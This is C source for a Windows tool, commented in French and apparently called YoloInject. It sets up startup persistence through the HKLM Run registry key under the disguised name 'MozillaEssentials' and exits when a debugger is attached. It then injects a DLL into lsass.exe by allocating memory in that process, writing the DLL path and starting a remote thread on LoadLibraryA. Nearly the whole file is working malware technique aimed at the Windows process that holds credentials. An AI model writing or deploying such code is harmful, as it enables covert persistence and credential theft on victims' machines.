#include <windows.h>
#include <psapi.h>
#include <stdio.h>
#include "YoloInject.h"

/*
* Lance le service au démarrage via les clefs de registre
*/
int installExe() {
	const WCHAR yoloDllPathReg[] = L"C:\\Users\\admin\\Documents\\Dll\\YoloDll\\Release\\YoloService.exe start";
	LPWSTR regKey = TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
	HKEY hKey;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, regKey, 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, TEXT("MozillaEssentials"), 0, REG_SZ, (const BYTE*)yoloDllPathReg, sizeof(yoloDllPathReg));
	RegCloseKey(hKey);
	return 0;
}

int injectDll(const char *dllPath) {
	char procName[] = "lsass.exe";
	HANDLE process;
	LPVOID allocatedAddr;
	SIZE_T nbOfBytesWritten;
	PTHREAD_START_ROUTINE loadLibAddr;
	HANDLE newThread;
	// Si le programme est en train d'être debuggé on s'arrête
	if (IsDebuggerPresent()) return 1;

	// Pour s'injecter dans le processus lsass, il que l'injection se fasse depuis un service.
	// On récupère l'ID du processus Lsass.exe
	DWORD processId = getProcessId(procName);
	if (!processId) {
		return 1;
	}
	// On ouvre le processus pour aller écrire dedans
	process = OpenProcess(PROCESS_ALL_ACCESS, 0, processId);

	printf("Memory to allocate: %i\n => %s\n", strlen(dllPath) + 1, dllPath);

	// Ici on alloue suffisament de place dans lsass pour y écrire le chemin de la dll à injecter
	if ((allocatedAddr = VirtualAllocEx(process, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE)) == NULL) {
		printf("Couldn't allocate memory. (%i) \n", GetLastError());
		return 1;
	}
	
	// On écrit le chemin de notre dll dans l'espace précédement alloué
	if (WriteProcessMemory(process, allocatedAddr, dllPath, strlen(dllPath), NULL) == NULL) {
		printf("Could not write process memory. (%i) \n", GetLastError());
		return 1;
	}

	// On récupère la méthode LoadLibraryA dans l'api Kernel32
	loadLibAddr = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryA");
	if (!loadLibAddr) {
		printf("GetProcAddress failed (%i)\n", GetLastError());
		return 1;
	}

	// On lance un nouveau thread dans LSASS.exe, qui exécutera la dll dedans.
	if ((newThread = CreateRemoteThread(process, NULL, 0, loadLibAddr, allocatedAddr, 0, NULL)) == NULL){
		printf("could not create remote thread, error: %i\n", GetLastError());
		if (GetLastError() == ERROR_NOT_ENOUGH_MEMORY) {
			printf("Not Enough memory");
		}
		return 1;
	}
	printf("Remote Thread created !\n");
	return 0;
}

DWORD getProcessId(char *processName) {
	DWORD processIds[0x1000];
	DWORD bytesReturned;
	EnumProcesses(processIds, 0x1000, &bytesReturned);
	DWORD i;
	unsigned int j;
	HANDLE process;
	HMODULE hModules[1024];
	DWORD cbNeeded = NULL;
	BOOL found;
	for (i = 0; i < bytesReturned; i++) {
		if (processIds[i] == NULL || (process = OpenProcess(0x410, 0, processIds[i])) == NULL ||
			EnumProcessModules(process, hModules, sizeof(hModules), &cbNeeded) == NULL) {
			continue;
		}

		found = false;


		for (j = 0; j < (cbNeeded / sizeof(HMODULE)); j++) {
			TCHAR szModName[MAX_PATH];
			if (GetModuleBaseNameA(process, hModules[j], (LPSTR)szModName, sizeof(szModName) / sizeof(TCHAR)) == NULL) {
				continue;
			}

			if (_strnicmp((const char *)szModName, processName, 10) != NULL){
				continue;
			}
			found = true;
			break;
		}

		if (!found) {
			continue;
		}
		printf("Found %s !\n", processName);

		CloseHandle(process);
		return processIds[i];
	}
	return NULL;
}